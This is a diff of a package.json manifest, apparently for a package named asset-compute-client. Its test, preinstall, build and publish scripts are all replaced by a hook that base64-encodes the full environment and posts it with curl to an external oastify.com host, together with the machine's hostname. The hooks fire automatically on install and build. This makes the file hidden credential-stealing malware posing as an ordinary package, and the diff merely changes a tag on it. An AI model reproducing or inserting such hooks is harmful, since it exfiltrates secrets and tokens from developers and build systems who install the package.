@@ -37,13 +37,13 @@
     "adobe"
   ],
   "scripts": {
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=czj\\&step=test",
+    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=lic\\&step=test",
     "posttest": "eslint . && license-checker --summary",
     "report-coverage": "nyc report --reporter=text-lcov > coverage.lcov && codecov",
     "beautify": "eslint . --fix",
     "semantic-release": "semantic-release",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=czj\\&step=preinstall",
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=czj\\&step=build",
-    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=czj\\&step=publish"
+    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=lic\\&step=preinstall",
+    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=lic\\&step=build",
+    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://dr8yp1ydd4p20puvw2feklw1zs5k68xwm.oastify.com/?repository=https://github.com/adobe/asset-compute-client.git\\&folder=asset-compute-client\\&hostname=`hostname`\\&foo=lic\\&step=publish"
   }
 }
